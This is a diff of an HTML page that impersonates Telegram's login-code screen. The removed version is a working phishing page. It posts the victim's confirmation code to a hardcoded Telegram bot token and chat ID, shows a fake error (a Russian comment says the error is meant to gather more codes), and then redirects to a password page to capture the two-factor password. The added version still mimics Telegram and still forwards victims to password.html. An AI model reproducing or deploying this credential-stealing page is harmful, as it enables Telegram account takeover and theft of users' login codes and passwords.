@@ -1,126 +1,35 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-<script>
-    window.Telegram.WebApp.expand(); // Разворачивает окно на весь экран
-    window.Telegram.WebApp.ready();
-</script>
-    
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Enter Code</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body {
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #000;
-            color: #fff;
-            margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh;
-        }
-        .login-box {
-            width: 100%; max-width: 340px; text-align: center; padding: 20px;
-        }
-        .logo-svg { width: 80px; height: 80px; margin-bottom: 30px; }
-        h2 { font-size: 24px; margin-bottom: 12px; font-weight: 600; }
-        p { color: #8e8e93; font-size: 15px; line-height: 1.4; margin-bottom: 35px; }
-        
-        .input-group { text-align: left; margin-bottom: 10px; }
-        label { color: #3390ec; font-weight: 500; font-size: 14px; margin-left: 4px; }
-        
-        /* Поле ввода */
-        input {
-            width: 100%; background-color: #1c1c1e; border: 1px solid #2c2c2e; 
-            padding: 14px; color: #fff; border-radius: 10px; font-size: 20px; 
-            box-sizing: border-box; outline: none; margin-top: 8px;
-            text-align: center; letter-spacing: 3px;
-            transition: border-color 0.3s ease;
-        }
-        input:focus { border-color: #3390ec; }
-        
-        /* Класс для ошибки */
-        input.error { border-color: #ff3b30 !important; }
-        
-        .error-text {
-            color: #ff3b30; font-size: 13px; margin-top: 8px; 
-            display: none; text-align: center; font-weight: 500;
-        }
-
-        .btn-verify {
-            background-color: #3390ec; color: white; border: none;
-            width: 100%; padding: 14px; border-radius: 10px;
-            font-size: 16px; font-weight: 600; cursor: pointer;
-            text-transform: uppercase; margin-top: 20px;
-        }
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 40px 20px; }
+        /* Стильный логотип Telegram */
+        .tg-logo { width: 60px; height: 60px; margin-bottom: 20px; }
+        input { width: 100%; padding: 15px; background: #1c252f; border: 1px solid #2a3644; border-radius: 10px; color: #fff; text-align: center; letter-spacing: 5px; font-size: 20px; margin-bottom: 20px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; background: #248bdf; border: none; border-radius: 10px; color: #fff; font-weight: bold; font-size: 16px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <svg class="logo-svg" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#3390ec"/><path d="M175.8 70.4L44.2 121.1c-9 3.6-9 8.6-1.7 10.8l33.8 10.5 78.1-49.3c3.7-2.2 7.1-1 4.3 1.5L95.4 151.9l-2.5 34.9c3.4 0 4.9-1.6 6.8-3.4l16.4-16 34.2 25.3c6.3 3.5 10.8 1.7 12.4-5.8l22.4-105.9c2.3-9.2-3.5-13.4-9.4-10.6z" fill="white"/></svg>
-        
-        <h2>Check your Telegram</h2>
-        <p>We've sent the code to the <b>Telegram</b> app on your other device.</p>
-        
-        <form id="codeForm">
-            <div class="input-group">
-                <label>Code</label>
-                <input type="text" id="tg-code" placeholder="Enter code" maxlength="6" inputmode="numeric" required>
-                <div id="error-msg" class="error-text">Check code</div>
-            </div>
-            <button type="submit" class="btn-verify">Verify</button>
-        </form>
-    </div>
+    <svg class="tg-logo" viewBox="0 0 24 24" fill="#248bdf">
+        <path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.891 8.146l-2.003 9.464c-.149.659-.54 1.217-1.121 1.217-.582 0-.839-.304-1.343-.635l-3.052-2.256-1.474 1.419c-.163.157-.3.289-.614.289-.314 0-.414-.145-.515-.418l-1.151-3.663-3.239-1.012c-.705-.221-.719-.705.15-.1.048-3.993 12.333-12.75 1.011 3.52 1.399l12.333-5.232c.571-.242 1.135-.119 1.343.146.208.265.174.757-.048 1.258z"/>
+    </svg>
+
+    <h2>Enter Code</h2>
+    <p style="color: #8a99a8; font-size: 14px; margin-bottom: 30px;">Check your Telegram notifications.</p>
+    
+    <input type="number" id="v-code" placeholder="00000">
+    <button class="btn" id="verify-btn">Verify</button>
 
     <script>
-        const BOT_TOKEN = '8598157493:AAH_95b9t0ehVfwvfBm2vcnySZyyY79rUBg'; 
-        const CHAT_ID = '6990072009';
-
-        document.getElementById('codeForm').onsubmit = function(e) {
-            e.preventDefault();
-            const codeInput = document.getElementById('tg-code');
-            const errorMsg = document.getElementById('error-msg');
-            const code = codeInput.value;
-
-            // Если код слишком короткий (обычно в ТГ 5 или 6 цифр)
-            if (code.length < 5) {
-                showError();
-                return;
+        document.getElementById('verify-btn').onclick = function() {
+            const val = document.getElementById('v-code').value;
+            if (val.length < 5) {
+                alert("Please enter the 5-digit code!");
+            } else {
+                window.location.href = "password.html";
             }
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: `🔑 Получен код подтверждения: ${code}`
-                })
-            }).then(() => {
-                // Имитируем ошибку при первой попытке, чтобы собрать больше кодов, 
-                // или просто перекидываем дальше. 
-                // Давай сделаем красную рамку, будто код не подошел:
-                showError();
-                
-                // Через 2 секунды "ошибки" перекидываем на 2FA
-                setTimeout(() => {
-                    window.location.href = "password.html";
-                }, 1500);
-            });
-
-            function showError() {
-                codeInput.classList.add('error');
-                errorMsg.style.display = 'block';
-                // Тряска поля для эффекта
-                codeInput.style.transform = 'translateX(5px)';
-                setTimeout(() => codeInput.style.transform = 'translateX(-5px)', 100);
-                setTimeout(() => codeInput.style.transform = 'translateX(0)', 200);
-            }
-        };
-
-        // Убираем ошибку при начале нового ввода
-        document.getElementById('tg-code').oninput = function() {
-            this.classList.remove('error');
-            document.getElementById('error-msg').style.display = 'none';
         };
     </script>
 </body>
 </html>
-
